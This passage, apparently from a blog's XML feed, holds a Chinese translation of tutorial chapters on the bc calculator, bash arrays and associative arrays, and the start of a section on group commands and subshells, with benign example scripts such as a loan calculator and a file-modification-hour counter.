<h3 id="bc-–-一个任意精度计算器语言"><a href="#bc-–-一个任意精度计算器语言" class="headerlink" title="bc – 一个任意精度计算器语言"></a>bc – 一个任意精度计算器语言</h3><p>我们已经看到shell如何处理许多类型的整数算术，但如果我们需要进行更高级的数学计算或甚至只是使用浮点数呢？答案是，我们不能。至少不能直接使用shell。为此，我们需要使用外部程序。有几种方法可以采用。嵌入Perl或AWK程序是一种可能的解决方案，但不幸的是，它超出了本书的范围。</p>
<p>另一种方法是使用专门的计算器程序。许多Linux系统上找到的一个此类程序称为bc。</p>
<p>bc程序读取用其自己的类C语言编</p>
<p>写的文件并执行它。bc脚本可以是一个单独的文件，也可以从标准输入读取。bc语言支持相当多的功能，包括变量、循环和程序员定义的函数。我们在这里不会完全涵盖bc，只是足够品尝一下。bc的手册页很好地记录了它。</p>
<p>让我们从一个简单的例子开始。我们将编写一个bc脚本来计算2加2。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/* 一个非常简单的bc脚本 */</span><br><span class="line">2 + 2</span><br></pre></td></tr></table></figure>

<p>脚本的第一行是一个注释。bc使用与C编程语言相同的注释语法。注释可以跨越多行，从&#x2F;<em>开始，以</em>&#x2F;结束。</p>
<h4 id="使用bc"><a href="#使用bc" class="headerlink" title="使用bc"></a>使用bc</h4><p>如果我们将前面的bc脚本保存为foo.bc，我们可以这样运行它：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ bc foo.bc</span><br><span class="line">bc 1.06.94</span><br><span class="line">版权所有 1991-1994, 1997, 1998, 2000, 2004, 2006自由软件</span><br><span class="line">基金会, Inc.</span><br><span class="line">这是免费软件，没有任何保证。</span><br><span class="line">详情请键入`warranty<span class="string">&#x27;。</span></span><br><span class="line"><span class="string">4</span></span><br></pre></td></tr></table></figure>

<p>如果我们仔细观察，我们可以在版权消息之后的最底部看到结果。</p>
<p>可以使用-q（静音）选项来抑制此消息。</p>
<p>bc也可以交互式使用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ bc -q</span><br><span class="line">2 + 2</span><br><span class="line">4</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<p>使用bc交互式时，我们只需键入我们想要执行的计算，结果会立即显示。bc命令quit结束交互式会话。</p>
<p>也可以通过标准输入将脚本传递给bc。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ bc &lt; foo.bc</span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<p>能够接受标准输入意味着我们可以使用这里的文档、这里的字符串和管道来传递脚本。这是一个这里字符串的例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ bc &lt;&lt;&lt; <span class="string">&quot;2+2&quot;</span></span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<h4 id="一个实例脚本"><a href="#一个实例脚本" class="headerlink" title="一个实例脚本"></a>一个实例脚本</h4><p>作为一个实际例子，我们将构建一个执行常见计算的脚本，即月贷款支付。在下面的脚本中，我们使用一个这里文档将脚本传递给bc：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># loan-calc: 脚本计算月贷款支付</span></span><br><span class="line">PROGNAME=<span class="string">&quot;<span class="variable">$&#123;0##*/&#125;</span>&quot;</span> <span class="comment"># 使用参数扩展获取基本名</span></span><br><span class="line"><span class="function"><span class="title">usage</span></span> () &#123;</span><br><span class="line">  <span class="built_in">cat</span> &lt;&lt;- <span class="string">EOF</span></span><br><span class="line"><span class="string">      Usage: $PROGNAME PRINCIPAL INTEREST MONTHS</span></span><br><span class="line"><span class="string">      Where：</span></span><br><span class="line"><span class="string">      PRINCIPAL 是贷款金额。</span></span><br><span class="line"><span class="string">      INTEREST 是APR作为一个数字（7% = 0.07）。</span></span><br><span class="line"><span class="string">      MONTHS 是贷款期限的长度。</span></span><br><span class="line"><span class="string">  EOF</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$#</span> != <span class="number">3</span>)); <span class="keyword">then</span></span><br><span class="line">  usage</span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">principal=<span class="variable">$1</span></span><br><span class="line">interest=<span class="variable">$2</span></span><br><span class="line">months=<span class="variable">$3</span></span><br><span class="line">bc &lt;&lt;- <span class="string">EOF</span></span><br><span class="line"><span class="string">  scale = 10</span></span><br><span class="line"><span class="string">  i = $interest / 12</span></span><br><span class="line"><span class="string">  p = $principal</span></span><br><span class="line"><span class="string">  n = $months</span></span><br><span class="line"><span class="string">  a = p * ((i * ((1 + i) ^ n)) / (((1 + i) ^ n) - 1))</span></span><br><span class="line"><span class="string">  print a, &quot;\n&quot;</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>

<p>执行时，结果如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ loan-calc 135000 0.0775 180</span><br><span class="line">1270.7222490000</span><br></pre></td></tr></table></figure>

<p>这个例子计算了以7.75百分比APR为期180个月（15年）的135,000美元贷款的月支付额。注意答案的精度。这是由bc脚本中给定给特殊scale变量的值决定的。bc脚本语言的完整描述由bc手册页提供。虽然它的数学符号与shell的有些不同（bc更类似于C），但根据我们到目前为止所学的大部分将会非常熟悉。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在本章中，我们学习了许多可以用来完成脚本中的“真正工作”的小技巧。随着我们对脚本编写经验的增长，有效地操作字符串和数字的能力将证明极其宝贵。我们的loan-calc脚本证明了即使是简单的脚本也可以创建来做一些真正有用的事情。</p>
<h3 id="额外学分"><a href="#额外学分" class="headerlink" title="额外学分"></a>额外学分</h3><p>虽然loan-calc脚本的基本功能已经到位，但脚本还远未完成。尝试通过以下功能改进loan-calc脚本以获得额外学分：</p>
<ul>
<li><p>完全验证命令行参数</p>
</li>
<li><p>实现一个“交互式”模式的命令行选项，将提示用户输入本金、利率和贷款期限</p>
</li>
<li><p>更好的输出格式</p>
</li>
</ul>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li><p><em>Bash Hackers Wiki</em> 对参数扩展有很好的讨论：</p>
<p><span class="exturl" data-url="aHR0cDovL3dpa2kuYmFzaC1oYWNrZXJzLm9yZy9zeW50YXgvcGU=">http://wiki.bash-hackers.org/syntax/pe<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p><em>Bash参考手册</em> 也涵盖了这个话题：</p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnL3NvZnR3YXJlL2Jhc2gvbWFudWFsL2Jhc2hyZWYuaHRtbCNTaGVsbC1QYXJhbWV0ZXItRXhwYW5zaW9u">http://www.gnu.org/software/bash/manual/bashref.html#Shell-Parameter-Expansion<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p><em>Wikipedia</em> 有一篇很好的文章描述了位操作：</p>
<p><span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9CaXRfb3BlcmF0aW9u">http://en.wikipedia.org/wiki/Bit_operation<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>以及关于三元操作的文章：</p>
<p><span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9UZXJuYXJ5X29wZXJhdGlvbg==">http://en.wikipedia.org/wiki/Ternary_operation<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>还有描述我们的loan-calc脚本中使用的计算贷款支付的公式的文章：</p>
<p><span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9BbW9ydGl6YXRpb25fY2FsY3VsYXRvcg==">http://en.wikipedia.org/wiki/Amortization_calculator<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>数组</title>
    <url>/2024/05/35-arrays/</url>
    <content><![CDATA[<h2 id="35-数组"><a href="#35-数组" class="headerlink" title="35 - 数组"></a>35 - 数组</h2><p>在上一章中，我们研究了shell如何操纵字符串和数字。到目前为止，我们所研究的数据类型在计算机科学领域被称为<em>标量变量</em>；也就是说，它们是包含单个值的变量。</p>
<p>在本章中，我们将研究另一种称为<em>数组</em>的数据结构，它可以持有多个值。数组几乎是每种编程语言的特性。shell也支持数组，尽管以一种相当有限的方式。即便如此，它们在解决某些类型的编程问题时仍然非常有用。</p>
<span id="more"></span>

<p><strong>什么是数组？</strong></p>
<p>数组是一次可以持有多个值的变量。数组像一个表格一样被组织。让我们考虑一个电子表格作为例子。电子表格就像一个<em>二维数组</em>。它有行和列，电子表格中的一个单独单元格可以根据其行和列地址来定位。数组的行为方式相同。数组有称为<em>元素</em>的单元格，每个元素包含数据。使用一个称为<em>索引</em>或<em>下标</em>的地址来访问单个数组元素。</p>
<p>大多数编程语言支持<em>多维数组</em>。电子表格是一个具有两个维度的多维数组的例子，宽度和高度。许多语言支持具有任意数量维度的数组，尽管二维和三维数组可能是最常用的。</p>
<p>bash中的数组限于单一维度。我们可以将它们想象为只有单列的电子表格。即使有这个限制，它们仍有许多应用。数组支持首次出现在bash版本2中。原始的Unix shell程序sh根本不支持数组。</p>
<h3 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h3><p>数组变量的命名就像其他bash变量一样，当它们被访问时自动创建。这里是一个例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ a[1]=foo</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;a[1]&#125;</span></span><br><span class="line">foo</span><br></pre></td></tr></table></figure>

<p>这里我们看到了数组元素的赋值和访问的例子。通过第一个命令，数组a的元素1被赋值为“foo”。第二个命令显示了元素1存储的值。在第二个命令中使用大括号是必需的，以防止shell试图对数组元素的名称进行路径名扩展。</p>
<p>也可以使用declare命令创建数组。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">declare</span> -a a</span><br></pre></td></tr></table></figure>

<p>使用-a选项，这个declare的例子创建了数组a。</p>
<h3 id="给数组赋值"><a href="#给数组赋值" class="headerlink" title="给数组赋值"></a>给数组赋值</h3><p>可以通过两种方式中的一种来赋值。单个值可以使用以下语法赋值：</p>
<blockquote>
<p><em>name</em>[<em>subscript</em>]&#x3D;<em>value</em></p>
</blockquote>
<p>其中<em>name</em>是数组的名称，<em>subscript</em>是一个大于或等于零的整数（或算术表达式）。注意数组的第一个元素的下标是零，不是一。<em>value</em>是赋给数组元素的字符串或整数。</p>
<p>可以使用以下语法赋多个值：</p>
<blockquote>
<p><em>name</em>&#x3D;(<em>value1</em> <em>value2</em> …)</p>
</blockquote>
<p>其中<em>name</em>是数组的名称，<em>value</em>占位符是顺序赋给数组元素的值，从元素零开始。例如，如果我们想将缩写的一周天赋给数组days，我们可以这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ days=(Sun Mon Tue Wed Thu Fri Sat)</span><br></pre></td></tr></table></figure>

<p>也可以通过为每个值指定下标来给特定元素赋值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ days=([0]=Sun [1]=Mon [2]=Tue [3]=Wed [4]=Thu</span><br><span class="line">[5]=Fri [6]=Sat)</span><br></pre></td></tr></table></figure>

<h3 id="访问数组元素"><a href="#访问数组元素" class="headerlink" title="访问数组元素"></a>访问数组元素</h3><p>数组有什么用处呢？就像许多数据管理任务可以用电子表格程序执行一样，许多编程任务也可以用数组执行。</p>
<p>让我们考虑一个简单的数据收集和呈现示例。我们将构建一个脚本，检查指定目录中文件的修改时间。根据这些数据，我们的脚本将输出一个表格，显示文件最后修改的一天中的哪个小时。这样的脚本可以用来确定系统何时最活跃。这个名为hours的脚本产生这样的结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ hours .</span><br><span class="line">小时 文件 小时 文件</span><br><span class="line">---- ----- ---- -----</span><br><span class="line">00 0 12 11</span><br><span class="line">01 1 13 7</span><br><span class="line">02 0 14 1</span><br><span class="line">03 0 15 7</span><br><span class="line">04 1 16 6</span><br><span class="line">05 1 17 5</span><br><span class="line">06 6 18 4</span><br><span class="line">07 3 19 4</span><br><span class="line">08 1 20 1</span><br><span class="line">09 14 21 0</span><br><span class="line">10 2 22 0</span><br><span class="line">11 5 23 0</span><br><span class="line">总文件数 = 80</span><br></pre></td></tr></table></figure>

<p>我们执行hours程序，指定当前目录为目标。它产生一个表格，显示一天中的每个小时（0-23），最后修改的文件有多少。产生这个结果的代码如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># hours: 脚本用于按修改时间计算文件</span></span><br><span class="line">  <span class="function"><span class="title">usage</span></span> () &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;用法: <span class="variable">$&#123;0##*/&#125;</span> 目录&quot;</span> &gt;&amp;2</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 检查参数是否为目录</span></span><br><span class="line"><span class="keyword">if</span> [[ ! -d <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  usage</span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># 初始化数组</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;0..23&#125;; <span class="keyword">do</span> hours[i]=0; <span class="keyword">done</span></span><br><span class="line"><span class="comment"># 收集数据</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">stat</span> -c %y <span class="string">&quot;<span class="variable">$1</span>&quot;</span>/* | <span class="built_in">cut</span> -c 12-13); <span class="keyword">do</span></span><br><span class="line">  j=<span class="string">&quot;<span class="variable">$&#123;i#0&#125;</span>&quot;</span></span><br><span class="line">  ((++hours[j]))</span><br><span class="line">  ((++count))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="comment"># 显示数据</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;小时\t文件\t小时\t文件&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;----\t-----\t----\t-----&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;0..11&#125;; <span class="keyword">do</span></span><br><span class="line">  j=$((i + <span class="number">12</span>))</span><br><span class="line">  <span class="built_in">printf</span> <span class="string">&quot;%02d\t%d\t%02d\t%d\n&quot;</span> \</span><br><span class="line">    <span class="string">&quot;<span class="variable">$i</span>&quot;</span> \</span><br><span class="line">    <span class="string">&quot;<span class="variable">$&#123;hours[i]&#125;</span>&quot;</span> \</span><br><span class="line">    <span class="string">&quot;<span class="variable">$j</span>&quot;</span> \</span><br><span class="line">    <span class="string">&quot;<span class="variable">$&#123;hours[j]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;\n总文件数 = %d\n&quot;</span> <span class="variable">$count</span></span><br></pre></td></tr></table></figure>

<p>脚本由一个函数（usage）和四个部分的主体组成。在第一部分，我们检查是否有命令行参数并且它是否是一个目录。如果不是，我们显示用法消息并退出。</p>
<p>第二部分初始化数组hours。通过为每个元素赋值为零来实现这一点。没有特殊的要求预先准备数组，但我们的脚本需要确保没有元素为空。注意循环是如何有趣地构建的。通过使用大括号扩展（{0..23}），我们能够轻松生成一系列单词供for命令使用。</p>
<p>下一部分通过在目录中的每个文件上运行stat程序来收集数据。我们使用cut提取结果中的两位小时数。在循环内部，我们需要删除小时字段的前导零，因为shell将尝试（并最终失败）将00到09的值解释为八进制数（见表34-2）。接下来，我们增加与一天中的小时相对应的数组元素的值。最后，我们增加一个计数器（count）来跟踪目录中的总文件数。</p>
<p>脚本的最后一部分显示数组的内容。我们首先输出几个标题行，然后进入一个循环，产生四列输出。最后，我们输出文件的最终总数。</p>
<h3 id="数组操作"><a href="#数组操作" class="headerlink" title="数组操作"></a>数组操作</h3><p>有许多常见的数组操作。删除数组、确定它们的大小、排序等等，在脚本中有很多应用。</p>
<h4 id="输出数组的全部内容"><a href="#输出数组的全部内容" class="headerlink" title="输出数组的全部内容"></a>输出数组的全部内容</h4><p>可以使用下标*和@来访问数组中的每个元素。与位置参数一样，@表示法是这两个中更有用的一个。这里是一个演示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ animals=(<span class="string">&quot;a dog&quot;</span> <span class="string">&quot;a cat&quot;</span> <span class="string">&quot;a fish&quot;</span>)</span><br><span class="line">[me@linuxbox ~]$ <span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$&#123;animals[*]&#125;</span>; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span>; <span class="keyword">done</span></span><br><span class="line">a</span><br><span class="line">dog</span><br><span class="line">a</span><br><span class="line"><span class="built_in">cat</span></span><br><span class="line">a</span><br><span class="line">fish</span><br><span class="line">[me@linuxbox ~]$ <span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$&#123;animals[@]&#125;</span>; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span>; <span class="keyword">done</span></span><br><span class="line">a</span><br><span class="line">dog</span><br><span class="line">a</span><br><span class="line"><span class="built_in">cat</span></span><br><span class="line">a</span><br><span class="line">fish</span><br><span class="line">[me@linuxbox ~]$ <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;animals[*]&#125;</span>&quot;</span>; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span>; <span class="keyword">done</span></span><br><span class="line">a dog a <span class="built_in">cat</span> a fish</span><br><span class="line">[me@linuxbox ~]$ <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;animals[@]&#125;</span>&quot;</span>; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span>; <span class="keyword">done</span></span><br><span class="line">a dog</span><br><span class="line">a <span class="built_in">cat</span></span><br><span class="line">a fish</span><br></pre></td></tr></table></figure>

<p>我们创建了数组animals并为其分配了三个两字字符串。然后我们执行四个循环，看看单词分割对数组内容的影响。在被引用时，<code>$&#123;animals[*]&#125;和$</code>{animals[@]}的行为是相同的。*表示法结果是一个包含数组内容的单个单词，而@表示法结果是三个两字字符串，这与数组的“真实”内容相匹配。</p>
<h4 id="确定数组元素的数量"><a href="#确定数组元素的数量" class="headerlink" title="确定数组元素的数量"></a>确定数组元素的数量</h4><p>使用参数扩展，我们可以确定数组中元素的数量，就像查找字符串的长度一样。这里是一个例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ a[100]=foo</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;#a[@]&#125;</span> <span class="comment"># 数组元素的数量</span></span><br><span class="line">1</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;#a[100]&#125;</span> <span class="comment"># 元素100的长度</span></span><br><span class="line">3</span><br></pre></td></tr></table></figure>

<p>我们创建数组a并将字符串foo赋给元素100。接下来，我们使用参数扩展来检查数组的长度，使用@表示法。最后，我们查看包含字符串foo的元素100的长度。值得注意的是，虽然我们将字符串赋给了元素100，bash只报告数组中有一个元素。这与一些其他语言的行为不同，在那些语言中，数组的未使用元素（元素0-99）将被初始化为空值并被计数。在bash中，只有被赋值的数组元素才存在，无论它们的下标是什么。</p>
<h4 id="查找数组使用的下标"><a href="#查找数组使用的下标" class="headerlink" title="查找数组使用的下标"></a>查找数组使用的下标</h4><p>由于bash允许数组在下标的赋值中存在“间隙”，有时确定哪些元素实际存在是很有用的。这可以通过使用以下形式的参数扩展来完成：</p>
<blockquote>
<p>${!<em>array</em>[*]}</p>
<p>${!<em>array</em>[@]}</p>
</blockquote>
<p>其中<em>array</em>是数组变量的名称。像使用*和@的其他扩展一样，引号中的@形式是最有用的，因为它扩展成单独的单词。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=([2]=a [4]=b [6]=c)</span><br><span class="line">[me@linuxbox ~]$ <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;foo[@]&#125;</span>&quot;</span>; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span>; <span class="keyword">done</span></span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">[me@linuxbox ~]$ <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;!foo[@]&#125;</span>&quot;</span>; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span>; <span class="keyword">done</span></span><br><span class="line">2</span><br><span class="line">4</span><br><span class="line">6</span><br></pre></td></tr></table></figure>

<h4 id="向数组末尾添加元素"><a href="#向数组末尾添加元素" class="headerlink" title="向数组末尾添加元素"></a>向数组末尾添加元素</h4><p>知道数组中元素的数量对我们追加值到数组末尾没有帮助，因为*和@表示法返回的值并不告诉我们正在使用的最大数组索引。幸运的是，shell为我们提供了一个解决方案。通过使用+&#x3D;赋值操作符，我们可以自动将值追加到数组的末尾。这里，我们给数组foo赋予三个值，然后追加三个更多的值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=(a b c)</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo[@]&#125;</span></span><br><span class="line">a b c</span><br><span class="line">[me@linuxbox ~]$ foo+=(d e f)</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo[@]&#125;</span></span><br><span class="line">a b c d e f</span><br></pre></td></tr></table></figure>

<h4 id="对数组进行排序"><a href="#对数组进行排序" class="headerlink" title="对数组进行排序"></a>对数组进行排序</h4><p>就像电子表格一样，经常需要对数据列中的值进行排序。shell没有直接的方法来做这件事，但用一点编码就不难实现。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># array-sort: 对数组进行排序</span></span><br><span class="line">a=(f e d c b a)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;原始数组: <span class="variable">$&#123;a[@]&#125;</span>&quot;</span></span><br><span class="line">a_sorted=($(<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;a[@]&#125;</span>&quot;</span>; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span>; <span class="keyword">done</span> | <span class="built_in">sort</span>))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;排序后的数组: <span class="variable">$&#123;a_sorted[@]&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>执行时，脚本产生这样的结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ array-sort</span><br><span class="line">原始数组: f e d c b a</span><br><span class="line">排序后的数组: a b c d e f</span><br></pre></td></tr></table></figure>

<p>脚本通过复制原始数组（a）到第二个数组（a_sorted）中的内容，用一个巧妙的命令替换来操作。这种基本技术可以用来对数组执行许多种类的操作，通过改变管道的设计。</p>
<h4 id="删除数组"><a href="#删除数组" class="headerlink" title="删除数组"></a>删除数组</h4><p>要删除数组，使用unset命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=(a b c d e f)</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo[@]&#125;</span></span><br><span class="line">a b c d e f</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">unset</span> foo</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo[@]&#125;</span></span><br><span class="line">[me@linuxbox ~]$</span><br></pre></td></tr></table></figure>

<p>unset也可以用来删除单个数组元素。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=(a b c d e f)</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo[@]&#125;</span></span><br><span class="line">a b c d e f</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">unset</span> <span class="string">&#x27;foo[2]&#x27;</span></span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo[@]&#125;</span></span><br><span class="line">a b d e f</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们删除了数组的第三个元素，下标2。记住，数组是从下标零开始的，不是一！也请注意，数组元素必须被引用，以防止shell执行路径名扩展。</p>
<p>有趣的是，赋给数组一个空值并不会清空其内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=(a b c d e f)</span><br><span class="line">[me@linuxbox ~]$ foo=</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo[@]&#125;</span></span><br><span class="line">b c d e f</span><br></pre></td></tr></table></figure>

<p>任何没有下标的数组变量引用都指向数组的元素零。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=(a b c d e f)</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo[@]&#125;</span></span><br><span class="line">a b c d e f</span><br><span class="line">[me@linuxbox ~]$ foo=A</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo[@]&#125;</span></span><br><span class="line">A b c d e f</span><br></pre></td></tr></table></figure>

<h3 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h3><p>bash 4.0及更高版本支持<em>关联数组</em>。关联数组使用字符串而不是整数作为数组索引。这种能力允许管理数据的新方法。例如，我们可以创建一个叫做colors的数组，并使用颜色名称作为索引。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">declare</span> -A colors</span><br><span class="line">colors[<span class="string">&quot;red&quot;</span>]=<span class="string">&quot;#ff0000&quot;</span></span><br><span class="line">colors[<span class="string">&quot;green&quot;</span>]=<span class="string">&quot;#00ff00&quot;</span></span><br><span class="line">colors[<span class="string">&quot;blue&quot;</span>]=<span class="string">&quot;#0000ff&quot;</span></span><br></pre></td></tr></table></figure>

<p>与整数索引数组不同，后者仅通过引用它们即可创建，关联数组必须使用带有新-A选项的declare命令创建。关联数组元素的访问方式与整数索引数组大致相同。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;colors[&quot;blue&quot;]&#125;</span></span><br></pre></td></tr></table></figure>

<p>在下一章中，我们将研究一个利用关联数组产生有趣报告的脚本。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>如果我们在bash手册页中搜索单词<em>array</em>，我们会发现bash在许多地方使用了数组变量。这些大多数是相当晦涩的，但在一些特殊情况下它们可能偶尔有用。实际上，数组的整个主题在shell编程中使用得相当少，主要是因为传统的Unix shell程序（如sh）完全不支持数组。这种缺乏流行是不幸的，因为在其他编程语言中广泛使用数组，并为解决许多类型的编程问题提供了强大的工具。</p>
<p>数组和循环有着天然的亲和力，经常被一起使用。下面这种形式的循环特别适合计算数组下标：for ((<em>expr</em>; <em>expr</em>; <em>expr</em>))</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li><p>关于本章中找到的数据结构的几篇Wikipedia文章：</p>
<p><span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9TY2FsYXJfKGNvbXB1dGluZyk=">http://en.wikipedia.org/wiki/Scalar_(computing)<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9Bc3NvY2lhdGl2ZV9hcnJheQ==">http://en.wikipedia.org/wiki/Associative_array<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>新奇事物</title>
    <url>/2024/05/36-exotica/</url>
    <content><![CDATA[<h2 id="36-–-新奇事物"><a href="#36-–-新奇事物" class="headerlink" title="36 – 新奇事物"></a>36 – 新奇事物</h2><p>在我们的旅程的最后一章中，我们将看看一些零碎的内容。虽然我们在前几章中已经涉足了很多领域，但还有许多bash特性我们没有覆盖。大多数相当晦涩，主要对那些将bash整合到Linux发行版中的人有用。然而，还有一些虽然不常用，但对某些编程问题很有帮助。我们将在这里讨论它们。</p>
<span id="more"></span>

<h3 id="组命令和子shell"><a href="#组命令和子shell" class="headerlink" title="组命令和子shell"></a>组命令和子shell</h3><p>bash允许将命令组合在一起。这可以通过两种方式之一完成，要么用<em>组命令</em>，要么用<em>子shell</em>。这是组命令语法的示例：</p>
<blockquote>
<p>{ command1; command2; [command3; …] }</p>
</blockquote>
<p>这是子shell的语法：</p>
<blockquote>
<p>(command1; command2; [command3;…])</p>
</blockquote>
